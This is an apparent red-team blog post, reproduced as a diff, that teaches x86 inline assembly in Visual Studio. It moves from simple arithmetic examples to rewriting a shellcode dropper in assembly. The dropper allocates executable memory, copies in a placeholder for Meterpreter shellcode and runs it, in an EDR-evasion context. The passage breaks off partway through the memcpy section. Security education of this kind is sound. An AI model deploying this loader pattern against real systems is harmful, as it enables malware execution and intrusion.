@@ -1,0 +1,976 @@
+# https://redops.at/en/blog/shell-we-assemble-unleashing-x86-inline-assembly-for-shellcode-execution
+
+<!DOCTYPE html><html lang="en">
+    <body id="Main">
+        
+        <main>
+                    <div class="blog-page">
+        <div class="page-intro">
+            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
+            <div class="content container">
+                <h1 class="h1">
+                    Shell We Assemble?
+                </h1>
+                <div class="blog-text-section">
+                    <h3>Unleashing Assembly for Shellcode Execution<br><br></h3>
+<p><strong>tl;dr </strong>In my last article, "<a href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low" target="_blank" rel="noreferrer noopener">Direct Syscalls: A journey from high to low</a>", we took a closer look at how Direct System Calls on Windows can be used to execute shellcode from an attacker's (red team's) point of view. In this article I want to look at the concept of the x86 Inline Assembly MSVC in the context of shellcode execution. The main points of this article are the basics of compilation and x86 (inline) assembly. We will also reinforce the basics with two assembly code examples. Finally, we will rewrite a high-level API dropper (Windows APIs) under Visual Studio 2019 to inline assembly.</p>
+                </div>
+                                                <ul class="tags">
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base?filter=Assembly">
+                                Assembly
+                            </a>
+                        </li>
+                                    </ul>
+            </div>
+            
+        </div>
+        <div class="blog-content">
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <figure class="image-center"><img src="https://redops.at/assets/images//transforms/blog/_small/samurai-katana-warrior-immortal-sun-silhouette-black-1920x1080-7471.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Disclaimer</h3>
+<p>The content and all code examples in this article are for research purposes only and must not be used in an unethical context! The code used in the form of x86 inline assembly is not novel and I make no claim to it. The basis for the code comes, as so often, from the <a href="https://www.ired.team/" target="_blank" rel="noreferrer noopener"><strong>ired.team</strong></a>, thank you <a href="https://twitter.com/spotheplanet" target="_blank" rel="noreferrer noopener"><strong>@spotheplanet</strong></a> for your brilliant work and sharing it with us all!</p>
+<p>The purpose of this blog post is not to evaluate whether there is any benefit to using x86 inline assembly in the context of EDR evasion. Rather, it is about understanding the basics of x86 inline assembly in the context of shellcode execution.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Introduction</h3>
+<p>In my last blog post "<a href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low" target="_blank" rel="noreferrer noopener">Direct Syscalls: A journey from high to low</a>" we deepened our knowledge about syscalls and direct system calls. While writing the Direct Syscall blog, I came across the term <strong>inline assembly</strong>, which made me curious and wanted to know more about inline assembly. I think there are many different preferences and opinions when it comes to programming languages (and that's a good thing), personally I'm one of those who is most fascinated by low-level languages like assembler. Even if assembler seems quite difficult at first, I find it all the cooler when the button gradually opens and you can understand, read and write more and more assembler code.</p>
+<p>Since I personally want to learn a bit more about <strong>x86 Inline Assembly MSVC</strong> (Microsoft Visual C++), my goal for this article is to create a shellcode dropper in x86 Inline Assembly MSVC under Visual Studio 2019 and share what I have learned with the community. More specifically, a C++ high-level API dropper (Windows APIs) will be used as a reference, which will then be rewritten in x86 Inline Assembly MSVC. Attached is a summary of the main points of this blog post:</p>
+<ul><li>From Code to Executable<br><br></li><li>Basics of x86 (Inline) Assembly <br><br></li><li>Example: x86 Inline Assembly MSVC <br><br></li><li>Extended example: x86 Inline Assembly MSVC<br><br></li><li>Shellcode Dropper: From C++ to Inline Assembly<br><br></li><li>Comparison: C++ vs Inline Assembly<br><br></li><li>Summary and insights</li></ul>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>From Code to Executable</h3>
+<p>Before I go into the basics of x86 assembly and inline assembly in the next section, I would like to explain some basics about the compiler, assembler and linker. This is not a detailed description, but it should help to better understand the concept of x86 inline assembly later on.</p>
+<p>Basically, to convert source code into machine code, different or more or fewer components are needed depending on the programming language used. For example, if you want to convert high-level code such as C, C++ or Python into machine code, you need a compiler, an assembler and a linker. The <strong>compiler</strong> converts the high-level code into assembly language, which is passed to the assembler. In the context of x86 and&nbsp;Visual Studio, the MSVC compiler (cl.exe) is used as the default compiler.<br><br>The <strong>assembler</strong> is then responsible for the conversion to machine code in the form of an object file (.o). In the context of x86 and&nbsp;Visual Studio, the Microsoft Macro Assembler (MASM; ml.exe) is used by default.<br><br>In the final step, the <strong>linker</strong> combines the object files, resolves the required symbols and links the necessary libraries to create the final executable file in the form of an .exe. The Incremental Linker (link.exe) is the default linker used in the context of Visual Studio. In summary, Visual Studio uses the following components to process high-level code.<br></p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/Process_from_C_to_exe.png" alt=""></figure><h4><br></h4>
+<h4>Assembly Code</h4>
+<p>If, on the other hand, you want to convert low-level code (assembler code) to machine code, all you need is an assembler to do the conversion to machine code, and a linker to create the executable (.exe) file. In summary, Visual Studio uses the following components to do this. </p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/Process_from_assembly_to_exe.png" alt=""></figure><h4><br></h4>
+<h4>Direct Syscalls (MASM)</h4>
+<p>On the other hand, if you want to use dedicated <strong>low-level code</strong> (assembler code) in the form of an <strong>.asm</strong> file in Visual Studio for the C++ project, the added .asm code must be processed by enabling <strong>MASM</strong> in order for it to be included in the .exe creation process correctly. This concept of using assembler code was used, for example, in the <a href="https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low" target="_blank" rel="noreferrer noopener"><strong>Direct Syscalls article</strong></a>. I.e. the required assembler code (generated with Syswhispers 2) was implemented as a resource in the Visual Studio project by means of an .asm file. Attached is the illustration I created for this.</p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/Process_from_C_to_exe_with_dedicated_asm.png" alt=""></figure><h4><br></h4>
+<h4>x86 Inline Assembly MSVC</h4>
+<p><strong></strong>However, Visual Studio now also provides the ability to implement <strong>assembly code</strong> in the form of <strong>x86 inline assembly</strong> instructions directly in the C++ source code. This results in the following possibilities, among others <br></p>
+<ul><li>In the case of a High Level API Dropper (Windows APIs), the Windows APIs used can be represented directly in the source code by corresponding x86 inline assembly code. <br><br></li><li>In the case of a direct syscall dropper, the required assembly instructions can be implemented directly in the main code. This is an exciting possibility, but is beyond the scope of this article. <br></li></ul><p></p>
+<p>For both scenarios, this has the advantage that the required assembly code - be it Windows APIs as x86 inline assembly code or the required code for native APIs and syscalls in x86 assembly - does not need to be added directly to an .asm file and compiled with MASM. Instead, the implementation of the x86 assembly instructions is done directly in the C++ source code and the compilation is done automatically by the MSVC compiler. In this article we focus on the possibilities in the context of a high level API dropper using Windows APIs to replace x86 inline assembly instructions.</p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/Process_from_C_with_inline_assembly_to_exe.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Basics of x86 (Inline) Assembly</h3>
+<p>In order to better understand the x86 assembly code written later in this article, a few basics about x86 (inline) assembly should be clarified first. This is only a very superficial introduction to the topic, going into more detail would definitely go beyond the scope of this article. If you still want to read and learn more about x86 assembly, I recommend the <a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html" target="_blank" rel="noreferrer noopener"><strong>x86 Assembly Guide</strong></a> from the University of Virginia, as well as the <a href="https://en.wikibooks.org/wiki/X86_Assembly" target="_blank" rel="noreferrer noopener"><strong>Wikibook</strong></a> about x86 assembly and the great <a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe" target="_blank" rel="noreferrer noopener"><strong>videos</strong></a> by Davy Wybiral.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Registers</h4>
+<p>In the world of x86 assembly, registers are fundamental components that act as high-speed memory in the CPU. Data and addresses are cached in these registers during the execution of a program to allow efficient processing and access to information. When learning x86 assembly, it is important to understand the different types of registers and their specific tasks. x86 assembly uses a 32-bit architecture, which means that general purpose registers are 32 bits wide. These registers can hold either data or addresses, depending on their use in a particular program. The most commonly used general purpose registers in the x86 assembly are <code>eax</code>, <code>ebx</code>, <code>ecx</code> and <code>edx</code>.</p>
+<figure class="image-center"><a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html"><img src="https://redops.at/assets/images/blog/x86-assembly-registers.png" alt="x86-Registers"></a><figcaption>https://www.cs.virginia.edu/~evans/cs216/guides/x86.html</figcaption></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The names of the registers are mostly historical. <code>Eax</code> (Extended Accumulator Register) was originally often used to store the results of arithmetic and logic operations, and for input/output operations. <code>Ebx</code> (Extended Base Register) was usually used as a base pointer for memory access, especially when addressing memory operands with an offset. <code>Ecx</code> (Extended Counter Register) was mainly used as a loop counter to facilitate the execution of repetitive tasks. <code>Edx</code> (Extended Data Register) was usually used with EAX for operations requiring larger amounts of data, such as multiplication and division.</p>
+<p>In addition to general purpose registers, there are special purpose registers for stack and flow management. <code>Esp</code> (Extended Stack Pointer) points to the top of the stack as it grows in memory, while <code>ebp</code> (Extended Base Pointer) is a frame pointer that points to local variables and parameters within a function. The <code>eip</code> (Extended Instruction Pointer) register contains the address of the next instruction to be executed and plays an important role in controlling the flow of the programme.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Instructions</h4>
+<p>The x86 assembly language consists of a set of instructions that act on these registers and memory to perform tasks such as arithmetic, logic, control flow and memory manipulation. Understanding the syntax and conventions of the x86 assembly language is critical to writing effective assembly code. This includes the use of <strong>mnemonics</strong> - such as <code>mov</code>, <code>push</code>,<code>pop</code>, <code>jmp</code>, <code>int</code>, <code>lea</code> etc. - short, human-readable names for instructions and operands that specify the data sources and destinations for those instructions.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Syntax x86 Inline Assembly MSVC</h4>
+<p>Firstly, the inline assembly syntax for MSVC in Visual Studio is <strong>only supported for x86</strong> and not for ARM and x64.</p>
+<p>The <strong>initialisation</strong> of an x86 inline assembly block in a C or C++ program in Visual Studio is done using the <code>__asm{}</code>; keyword. This allows assembler statements to be written directly alongside C or C++ code. Inline assembler can be a single statement, a group of statements enclosed in braces, or simply an empty pair of braces. The term <code>__asm block</code> refers to any assembler statement or group of statements following the keyword <code>__asm</code>, whether or not they are enclosed in braces.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Interfacing with C/C++ Code</h4>
+<p>An advantage of Inline Assembly is that an interface to the C/C++ code can be established by "<strong>interfacing</strong>" by referencing variables and function names directly in the assembly code. Placeholders are used to embed the C/C++ expressions in the Inline Assembly code. The following code example is intended to illustrate the interfacing.</p>
+<p>In simple terms, the C++ code shows that the declaration of the variables a, b and result takes place outside the Inline Assembly code, but the variables can be accessed through interfacing within the Inline Assembly block.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">int a = 1;
+int b = 2;
+int result;
+
+__asm {
+    mov eax, a
+    add eax, b
+    mov result, eax
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Example: x86 Inline Assembly MSVC</h4>
+<p>To reinforce the basics of x86 inline assembly, let's look at the following x86 inline assembly code, designed using MSVC syntax for compatibility with Visual Studio. First, we define the three variables <strong>a</strong>, <strong>b</strong> and <strong>result</strong>, where a and b are each defined as a basic integer (int) type.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">int a = 5, b = 10, result;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>In the next step, we use the keyword <code>__asm</code> to indicate that we want to start an x86 inline assembly block. We then use the <code>mov</code> instruction to move the variable a or its contents (5) into the <code>eax</code> register. Next, we use the <code>add</code> instruction to add the contents of the variable b (10) to the existing contents of <code>eax</code>. In simplified terms, <code>eax</code> already contains the number 5 in the first step, and we add the number 10 in the second step. Then we use <code>mov</code> to move or copy the contents of <code>eax</code> into the previously declared variable <code>result</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">__asm {
+        mov eax, a      ; Move the value of 'a' into the EAX register
+        add eax, b      ; Add the value of 'b' to EAX
+        mov result, eax ; Move the result from EAX into 'result'
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Finally, the content of the variable result is to be displayed on the screen and the programme is to be terminated.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">std::cout &lt;&lt; "The result is: " &lt;&lt; result &lt;&lt; std::endl;
+    return 0;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The complete code then looks like this and can be created as a C++ project in Visual Studio and compiled as x86 release or debug. The compiled .exe is run via cmd.exe and the contents of the result are output to the console window.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+int main() {
+    int a = 5, b = 10, result;
+
+    __asm {
+        mov eax, a      ; Move the value of 'a' into the EAX register
+        add eax, b      ; Add the value of 'b' to EAX
+        mov result, eax ; Move the result from EAX into 'result'
+    }
+
+    std::cout &lt;&lt; "The result is: " &lt;&lt; result &lt;&lt; std::endl;
+    return 0;
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Extended example: x86 Inline Assembly MSVC</h4>
+<p>We are going to extend the code a little and on the one hand we want to be able to declare the value of a third variable C. After the addition of the variables a and b, the value of the variable C is to be subtracted from the current content of the register <code>eax</code>, but only if the current value of <code>eax</code> is less than or equal to 5. The first extension to the existing code is to compare the current value of <code>eax</code> with the number 5 after the addition. This is done using the <code>cmp</code> instruction.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">cmp eax, 5     ; Compare the value of EAX with 5</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The result of the comparison is stored in the FLAGS register, which is used by the following conditional jump instruction <code>jle</code> (Jump less equal). However, the jump to the defined label <strong>skip_subtraction</strong> is only performed if the result of the comparison is less than or equal to 5. If the condition of <code>jle</code> is true, the current value of register <code>eax</code> is output.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">jle skip_subtraction ; Jump to 'skip_subtraction' if EAX is less than or equal to 5</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Otherwise, if the current value of register <code>eax</code> is greater than 5, the value declared in variable c is subtracted from <code>eax</code> and then <code>eax</code> is output.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">sub eax, c      ; Subtract the value of 'c' from EAX if EAX is greater than 5</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The whole code then looks like this again and can be created as a C++ project in Visual Studio and compiled as x86 release or debug. The compiled .exe is run via cmd.exe and the contents of the result are output to the console window.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+int main() {
+    int a = 5, b = 10, c = 3, result;
+
+    __asm {
+        mov eax, a      ; Move the value of 'a' into the EAX register
+        add eax, b      ; Add the value of 'b' to EAX
+        cmp eax, 5      ; Compare the value of EAX with 5
+        jle skip_subtraction ; Jump to 'skip_subtraction' if EAX is less than or equal to 5
+        sub eax, c      ; Subtract the value of 'c' from EAX if EAX is greater than 5
+    skip_subtraction:
+        mov result, eax ; Move the result from EAX into 'result'
+    }
+
+    std::cout &lt;&lt; "The result is: " &lt;&lt; result &lt;&lt; std::endl;
+    return 0;
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The code examples shown are basically simple code and x86 assembly is much more complex in most cases. Nevertheless, I think the code shown gives a first understanding of how x86 Inline Assembly works under Visual Studio and makes the following code examples a bit more understandable in the context of shell code execution.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Shellcode Dropper:&nbsp;From C++ to&nbsp;Inline Assembly</h3>
+<p>After a brief introduction to x86 assembly and inline assembly, let's start by creating the high-level inline assembly dropper API. As a reference, we will use the following C++ code, which allows the execution of x86 shellcode, e.g. x86 Meterpreter shellcode. In the reference code, the necessary functions are defined using high level APIs (Windows APIs) and we want to rewrite them step by step into the corresponding x86 inline assembly instructions.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+int main() {
+
+	// Insert Meterpreter shellcode  
+	unsigned char code[] = "\xa6\x12\xd9...";
+
+
+	// Allocate Virtual Memory 
+	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+
+	// Copy shellcode into allocated memory 
+	memcpy(exec, code, sizeof code);
+
+
+	// Execute shellcode in memory 
+	((void(*)())exec)();
+	return 0;
+	
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Shellcode declaration</h4>
+<p>The variable <code>code</code> remains as in the original code and is responsible for storing the x86 shell code for the time being. By "interfacing", the declaration of the variable can still be done outside the following inline assembly blocks. The <code>void*</code> pointer, which points to the <code>exec</code> variable and is used to store the address of the reserved memory, is also retained.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Insert Meterpreter shellcode  
+    unsigned char code[] = "\xa6\x12\xd9";
+
+    // Variable to store the allocated memory address and shellcode size
+    void* exec;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>codeSize</h4>
+<p>Before the declaration of the first inline assembly block, the variable <code>codeSize</code> is declared externally as a <code>DWORD</code>. This variable is used to calculate the size of the shellcode. One question I asked myself is why declare it as a <code>DWORD</code>? The reason is that we can only use inline assembly in Visual Studio in 32-bit form.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">DWORD codeSize = sizeof code;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x86 Inline Assembly: Allocate Memory</h4>
+<p>Then the Windows API <code>VirtualAlloc</code> of the Windows APIs is rewritten into appropriate <strong>assembly code</strong> and declared inside the first inline assembly block. As mentioned in the introduction, in Visual Studio the inline assembly block is initialised with the <code>__asm {}</code>; keyword and the inline assembly code is written inside the braces.</p>
+<p>In order for the VirtualAlloc function to run correctly as <strong>inline assembly code</strong>, the function's <strong>four arguments</strong> (0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE) must be pushed to the top of the stack in reverse order using <code>push</code>.<br><br>But why reverse order and not normal order? The reason lies in the way a LIFO stack (Last In First Out) works, and in the <code>__stdcall</code> calling convention of Win32 APIs (in this case <code>VirtualAlloc</code>). That is, in order for the four arguments of <code>VirtualAlloc</code> to be read in the correct order (from left to right) after being pushed onto the stack by a push instruction and then populated by a pop instruction, the <code>__stdcall</code> calling convention ensures that the caller first places the four arguments of VirtualAlloc onto the LIFO stack in reverse order.<br><br>At first I didn't quite understand the principle, but once it clicked, I thought I'd make the following graphic and hope that it makes the principle of LIFO and reverse order a little more understandable, and also helps to better understand inline assembly code and its order.<br></p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-size:16px;font-style:normal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;background-color:rgb(251,252,254);"><img src="https://redops.at/assets/images/blog/lifo_stack_principle_virutalalloc.png" alt=""></figure><p>Now that the functionality of reverse order in the context of a LIFO stack should be reasonably clear, let's start by rewriting the Windows API <code>VirtualAlloc</code> into the corresponding x86 inline assembly code based on MSVC syntax.<br><br>The inline assembly code is relatively simple, i.e. the four required arguments to <code>VirtualAlloc</code> are <strong>pushed</strong> onto the stack in reverse order. <code>VirtualAlloc</code> is then <strong>called</strong> using the <strong>call</strong> statement.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Push the function arguments onto the stack in reverse order for VirtualAlloc
+        push PAGE_EXECUTE_READWRITE
+        push MEM_COMMIT
+        push codeSize
+        push 0
+
+        // Call VirtualAlloc
+        call VirtualAlloc</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>With the next line of assembler code within the first inline assembly block, the content of the register <code>eax</code> is moved or copied into the variable <code>exec</code> using <code>mov</code>. But why the contents of <code>eax</code>, what does the register contain at this point in the programme flow?</p>
+<p>At this point, <code>eax</code> contains the <strong>base address</strong> of the <strong>memory</strong> area previously <strong>allocated</strong> by the correct execution of <code>VirtualAlloc</code>. The reason for writing the contents of <code>eax</code> into the variable <code>exec</code> is that the base address of the reserved memory area will be called later using <code>exec</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Store the result (allocated memory address) in 'exec'
+        mov exec, eax</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As already mentioned, the stack is a data structure that works according to the last-in-first-out (LIFO) principle, i.e. the intel stack grows downwards in memory (to lower addresses) when new elements are pushed onto the stack (PUSH()). When elements are removed from the stack (POP()), the stack grows upwards again (to higher addresses). The stack pointer (ESP) contains the address of the top of the stack. When elements are moved onto the stack, the stack pointer is decremented, when elements are removed from the stack, the stack pointer is incremented.</p>
+<p>In the given code, after calling VirtualAlloc, the four arguments (4 bytes each because x86) are still on the stack. To clean up the stack and free the memory occupied by these arguments, the stack pointer must be reset to the position it was in before the arguments were inserted. Since the arguments have occupied a total of 16 bytes (4 arguments * 4 bytes each), the stack pointer must be increased by 16 bytes with the instruction <code>add esp, 16</code>. This "removes" the four arguments from the stack and releases the occupied memory. The conversion of the VirtualAlloc Windows API format function to x86 inline assembly is now complete and the first inline assembly block is finished.</p>
+<p>Alternatively, <code>add esp, 16</code> can be replaced with <code>pop eax</code> four times. Using pop instructions in this way produces the same result as using <code>add esp, 16</code>, as both methods clean up the stack by freeing the memory occupied by the arguments.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Clean up the stack (4 arguments * 4 bytes each)
+        add esp, 16</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">// Alternative to clean up the stack (4 arguments * 4 bytes each)
+        pop eax
+        pop eax
+        pop eax
+        pop eax</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>However, using <code>add esp, 16</code> is simpler and more efficient, as only one instruction is needed to clean up the stack. Therefore, we stick to this version in our code. The finished inline assembly block for the shellcode memory reservation looks like this.</p>
+<h4>Correction!</h4>
+<p>When using Windows APIs such as <code>VirtualAlloc</code>, the stack is automatically freed by a <code>ret</code> statement after the function has finished. Dedicated execution of <code>add esp, 16</code> will <strong>corrupt the stack</strong>. The original code works in the context of running x86 Metrepreter shellcode and the implications are not entirely clear to me at this time, however the note has been reviewed and the code updated and <code>add esp, 16</code> removed or commented out. <strong>Thanks to <a href="https://twitter.com/x86matthew" target="_blank" rel="noreferrer noopener">@x86matthew</a></strong> for the tip!<br></p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/korrektur_stack.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer"><code class="code-block-inner language-cpp">__asm {
+        // Push the function arguments onto the stack in reverse order for VirtualAlloc
+        push PAGE_EXECUTE_READWRITE
+        push MEM_COMMIT
+        push codeSize
+        push 0
+
+        // Call VirtualAlloc
+        call VirtualAlloc
+
+        // Store the result (allocated memory address) in 'exec'
+        mov exec, eax
+
+        // Clean up the stack (4 arguments * 4 bytes each)
+        //add esp, 16
+    }</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p><strong><strong></strong>Additional information:</strong> Incrementing the stack pointer does not actually erase the data in memory, it just marks the memory as reusable. The next time data is pushed onto the stack, it may overwrite the old argument values, but until then the data may still be present in memory.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>x86 Inline Assembly: Copy Shellcode to Allocated Memory</h4>
+<p>With the second inline assembly block, we want to reproduce the C++ variant of the memcpy function in x86 inline assembly. This inline assembly block looks a little more complicated than the previous one, but in the end it is only responsible for ensuring that the shellcode is correctly copied into the previously allocated memory. In order for the copying process to work correctly, the assembly code must provide the following functions</p>
